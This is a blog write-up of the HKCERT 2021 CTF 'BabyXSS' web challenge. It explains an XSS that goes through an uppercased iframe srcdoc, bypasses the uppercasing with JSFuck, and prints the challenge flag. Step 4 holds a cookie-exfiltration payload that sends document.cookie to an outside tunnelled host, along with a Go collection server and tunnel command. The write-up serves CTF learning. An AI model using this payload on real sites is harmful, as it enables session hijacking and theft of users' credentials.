---
title: "HKCERT CTF 2021: 純孩兒 BabyXSS"
description: ""
date: 2021-11-16T02:00:32+08:00
math: false
draft: false
tags: ["ctf", "hkcert21", "web", "xss"]
---

> **This post is part of the [HKCERT 2021 CTF series](/tags/hkcert21).**

---

|     Name     | 純孩兒 (BabyXSS)                 |
| :----------: | -------------------------------- |
|     Tags     | web                              |
|    Points    | 100                              |
|  Difficulty  | ★☆☆☆☆                            |
|    Solves    | 37 (total of all four divisions) |
| Release Date | 2021-11-13 02:00:00              |

> Have you tried the infant XSS challenge in the training platform? If you did, then you can try out this BABY XSS CHALLENGE...
>
> http://babyxss-m7neh9.hkcert21.pwnable.hk
>
> XSS Bot: http://xssbot-cxild5.hkcert21.pwnable.hk

---

## Step 1: Obtaining

Check the source code of the page by prepending `view-source:` to the URL, i.e., `view-source:http://babyxss-m7neh9.hkcert21.pwnable.hk/`.

```html
<HTML>
<HEAD>
	<TITLE>BABY XSS</TITLE>
</HEAD>
<BODY ONLOAD="CONVERT()" ONHASHCHANGE="CONVERT()">
<H1>BABY XSS</H1>
<TEXTAREA ID="INPUT" ONCHANGE="WINDOW[LOCATION][HASH]=WINDOW[ENCODEURI](INPUT[VALUE])" STYLE="WIDTH:400;HEIGHT:300"></TEXTAREA>
<IFRAME ID="OUTPUT" STYLE="WIDTH:400;HEIGHT:300"></IFRAME>
<SCRIPT>
	TOUPPERCASE = "\164\157\125\160\160\145\162\103\141\163\145";
	SUBSTR = "\163\165\142\163\164\162";
	ENCODEURI = "\145\156\143\157\144\145\125\122\111";
	DECODEURI = "\144\145\143\157\144\145\125\122\111";
	VALUE = "\166\141\154\165\145";
	SRCDOC = "\163\162\143\144\157\143";
	CONTENTWINDOW = "\143\157\156\164\145\156\164\127\151\156\144\157\167";
	PARENT = "\160\141\162\145\156\164";
	LOCATION = "\154\157\143\141\164\151\157\156";
	HASH = "\150\141\163\150";
	WINDOW = OUTPUT[CONTENTWINDOW][PARENT];

	CONVERT = () => {
		INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](1));
		OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
	}
</SCRIPT>
</BODY>
</HTML>
```

We can see that this whole piece of code is uppercased. Also, the strings in the code inside the `script` tag is not readable, maybe because it's obfuscated?

So we input this whole piece of JavaScript code into https://deobfuscate.io. This is what we get.

```javascript {linenostart=10}
TOUPPERCASE = "toUpperCase";
SUBSTR = "substr";
ENCODEURI = "encodeURI";
DECODEURI = "decodeURI";
VALUE = "value";
SRCDOC = "srcdoc";
CONTENTWINDOW = "contentWindow";
PARENT = "parent";
LOCATION = "location";
HASH = "hash";
WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
CONVERT = () => {
  INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](1));
  OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
};
```

## Step 2: Analysing

Now that the code is made readable, we can clean up the code and figure out the flow of how this page works.

1. In **Line 7**, we can see that whenever the content in the text area is changed, a URL-encoded form of the content inside is appended to the current URL after a `#` (the hash part of the URL).
```html {linenostart=7}
<TEXTAREA ID="INPUT" ONCHANGE="window.location.hash=window.encodeURI(INPUT.value)" STYLE="WIDTH:400;HEIGHT:300"></TEXTAREA>
<!-- the cleaned code above is equivalent to the original -->
```
2. In **Line 5**, we can see that whenever the page is loaded or the hash part in the current URL is changed, the `CONVERT` function is called.
```html {linenostart=5}
<BODY ONLOAD="CONVERT()" ONHASHCHANGE="CONVERT()">
```
3. The `CONVERT` function is essentially replacing the content in the text area with the URL-decoded form of the hash part of the current URL, and also setting the `srcdoc` attribute of the output iframe to the uppercased form of the content in the text area.
```javascript {linenostart=21,hl_lines=[2]}
CONVERT = () => {
  document.getElementById("INPUT").value = window.decodeURI(window.location.hash.substr(1)); // substr(1) removes the '#' prefix
  document.getElementById("OUTPUT").srcdoc = INPUT.value.toUpperCase();
}; // the above code is cleaned and is equivalent to the original
```

## Step 3: XSS Attack Procedure

{{< figure src="1.png" width=600 >}}

Since the hash part of the current URL updates correspondingly to the current content in the input text area, it acts like a "state-saving-and-restoring" function. This means when we type some input in the text area, the hash part of the current URL is updated as it saves our input. If we pass the URL to the victim, the content in the input text area is restored from the hash part of the URL once the page is loaded.

In order to achieve XSS, we need to figure out some way to execute JavaScript in victim's browser as we can then get access to sensitive information (e.g., cookies) stored in his browser. To do that, we can make use of the iframe `srcdoc` mechanism as this attribute allows us to inject source document including JavaScript code into the iframe document. If we use JavaScript code as the input, when the victim loaded the page given a URL, the input content is restored and the JavaScript code will be executed in victim's browser.

Note that HTML tags are **case-insensitive**, whereas JavaScript variables are **case-sensitive**. This is rather important in this challenge because although there is no escaping or encoding used, the input content is uppercased (in Line 9) before being inserted into the `srcdoc` attribute of the output iframe.

This means that if we directly inject something like `<script>alert(1)</script>` into the output iframe as the code will become `<SCRIPT>ALERT(1)</SCRIPT>`, it won't be triggered due to `Uncaught ReferenceError: ALERT is not defined`.

So we need to come up with a way to bypass the uppercase transformation so that the code can still be executed even after being uppercased. A simple Google search with "*javascript uppercase xss*" returns a *StackExchange* question as the first result: [How can I execute a XSS when a web application transforms a data from lowercase to uppercase?](https://security.stackexchange.com/questions/117798/how-can-i-execute-a-xss-when-a-web-application-transforms-a-data-from-lowercase)

It turns out that we can use *JSFuck* to transform plain JavaScript code into its equivalent in the form of `[]()!+` characters. This effectively bypasses the uppercase transformation while still can execute the code that does the same thing.

## Step 4: Exploit

Now in order for us to get the cookie stored in the victim's browser, we can use `document.cookie`. We also need to make a way for us to receive this cookie. We can expose a simple LAN web server to the Internet and make a request to the server with `document.cookie` as part of the request.

This is the simple web server I used.

```go
// file: server.go
package main

import (
	"fmt"
	"net/http"
)

func root(w http.ResponseWriter, req *http.Request) {
	fmt.Println(req.URL.String())  // log the request URL
	fmt.Fprintf(w, "hello\n")
}

func main() {
	http.HandleFunc("/", root)
	http.ListenAndServe(":1313", nil) // localhost on port 1313
}
```

Run it with `go run server.go`, then expose it to the Internet using a free tunnelling service: http://localhost.run by running `ssh -R 80:localhost:1313 nokey@localhost.run`. Now we get a temporary hosted web server that can be accessed by the victim as well.

In order for the victim's browser to send its cookie to my server, our XSS payload can tell it to navigate to the URL of our server with the cookie as part of the URL query so that my server logs this URL that contains the cookie.

The following is the XSS payload I used. The URL domain is the one provided by the tunnelling service.

```javascript {linenos=false}
location.href="https://7795a3052e14c9.lhr.domains/?"+document.cookie
```

Then we will need to *JSFuck* the XSS payload, wraps it with the `script` tag, and type it into the input text area. Now you see the URL has changed, copy the URL and send it to the XSS Bot. Hooray! Now the flag shows up in the stdout of our server! `hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}`

```bash {linenos=false}
$ go run server.go
/?
/?flag=hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}
```
